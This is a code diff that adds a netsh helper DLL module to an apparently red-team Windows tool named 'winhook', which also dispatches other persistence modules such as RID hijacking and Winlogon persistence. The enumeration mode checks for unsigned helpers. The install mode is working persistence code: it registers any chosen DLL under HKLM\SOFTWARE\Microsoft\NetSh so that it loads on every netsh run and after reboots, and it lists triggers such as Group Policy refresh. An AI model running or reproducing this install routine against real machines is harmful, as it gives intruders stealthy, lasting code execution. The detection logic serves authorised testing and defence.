@@ -24618,6 +24618,136 @@ Write-Output "[*] New value: $new"
   return { output: output.join("\n"), findings }
 }
 
+async function netshHelper(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const dll = argVal(args, "--dll")
+  const helperName = argVal(args, "--name") || "CyberStrikeHelper"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Netsh Helper DLL Persistence...\n"]
+
+  const regPath = "HKLM:\\SOFTWARE\\Microsoft\\NetSh"
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Registered Netsh Helpers ==="
+Write-Output ""
+
+$helpers = Get-ItemProperty '${regPath}' -ErrorAction SilentlyContinue
+if ($helpers) {
+  $props = $helpers.PSObject.Properties | Where-Object { $_.Name -notlike 'PS*' }
+  $suspiciousCount = 0
+  foreach ($p in $props) {
+    $dllPath = $p.Value
+    $name = $p.Name
+    $exists = Test-Path $dllPath -ErrorAction SilentlyContinue
+    $signed = $false
+    if ($exists) {
+      $sig = Get-AuthenticodeSignature $dllPath -ErrorAction SilentlyContinue
+      $signed = $sig.Status -eq 'Valid'
+    }
+    $status = if (-not $exists) { "[!] FILE MISSING" } elseif (-not $signed) { "[!] UNSIGNED"; $suspiciousCount++ } else { "[OK] Signed" }
+    Write-Output "  $name"
+    Write-Output "    DLL: $dllPath"
+    Write-Output "    Status: $status"
+    Write-Output ""
+  }
+  Write-Output "Total helpers: $($props.Count)"
+  Write-Output "SUSPICIOUS_COUNT=$suspiciousCount"
+
+  # Known legitimate helpers
+  Write-Output ""
+  Write-Output "[*] Known Microsoft helpers: dhcpclient, dot3cfg, fwcfg, hnetmon, ifmon, napmontr, netiohlp, nteventlog, nshhttp, nshipsec, nshwfp, p2pnetsh, peerdistsh, ras, rpcnsh, whhelper, wshelper, wwancfg"
+} else {
+  Write-Output "[*] No netsh helpers found (unusual)"
+}
+
+Write-Output ""
+Write-Output "[*] Netsh helpers load when netsh.exe runs (admin tasks, firewall config, etc.)"
+Write-Output "[*] Common trigger: Group Policy refresh runs netsh for firewall rules"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const suspMatch = r.stdout.match(/SUSPICIOUS_COUNT=(\d+)/)
+    if (suspMatch && parseInt(suspMatch[1]) > 0) {
+      findings.push({
+        checkId: "WIN-NTSH-001",
+        provider: "windows",
+        severity: "medium",
+        status: "SUSPICIOUS",
+        resource: "registry://netsh",
+        title: `${suspMatch[1]} unsigned netsh helper DLL(s) found`,
+        details: "Unsigned DLLs registered as netsh helpers may indicate persistence. Review non-Microsoft entries.",
+        remediation: "Remove suspicious entries from HKLM\\SOFTWARE\\Microsoft\\NetSh.",
+      })
+    }
+  }
+
+  if (action === "install") {
+    if (!dll) {
+      output.push("ERROR: --dll required (path to helper DLL)")
+      output.push("")
+      output.push("Usage: winhook netsh_helper --action install --dll C:\\path\\helper.dll [--name MyHelper]")
+      output.push("")
+      output.push("[*] DLL must export InitHelperDll function")
+      output.push("[*] Loads whenever netsh.exe is invoked (admin tasks, GP refresh)")
+      output.push("[*] Runs in the context of the netsh.exe caller")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+Write-Output "=== Installing Netsh Helper ==="
+Write-Output "Name: ${helperName}"
+Write-Output "DLL: ${dll}"
+Write-Output ""
+
+Set-ItemProperty '${regPath}' -Name '${helperName}' -Value '${dll}' -Type String
+
+$verify = (Get-ItemProperty '${regPath}' -Name '${helperName}').${helperName}
+Write-Output "[+] Registered: ${helperName} -> $verify"
+Write-Output ""
+Write-Output "[*] DLL loads on next netsh.exe invocation"
+Write-Output "[*] Trigger: netsh advfirewall show allprofiles (or any netsh command)"
+Write-Output "[*] Also triggered by Group Policy refresh (gpupdate)"
+Write-Output ""
+Write-Output "Remove: winhook netsh_helper --action remove --name ${helperName}"
+Write-Output "STATUS=SUCCESS"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("STATUS=SUCCESS")) {
+      findings.push({
+        checkId: "WIN-NTSH-010",
+        provider: "windows",
+        severity: "critical",
+        status: "PERSISTED",
+        resource: `netsh://${helperName}`,
+        title: `Netsh helper DLL registered: ${helperName} → ${dll}`,
+        details: "DLL loads on every netsh.exe invocation. Persists across reboots.",
+        remediation: `Remove: winhook netsh_helper --action remove --name ${helperName}`,
+      })
+    }
+  }
+
+  if (action === "remove") {
+    const name = argVal(args, "--name")
+    if (!name) {
+      output.push("ERROR: --name required (helper name to remove)")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+Remove-ItemProperty '${regPath}' -Name '${name}' -Force -ErrorAction SilentlyContinue
+Write-Output "[+] Netsh helper '${name}' removed"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -28264,6 +28394,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   rid_hijack: ridHijack,
   winlogon_persist: winlogonPersist,
   appinit_dll: appinitDll,
+  netsh_helper: netshHelper,
 }
 
 export const WinhookTool = Tool.define("winhook", {
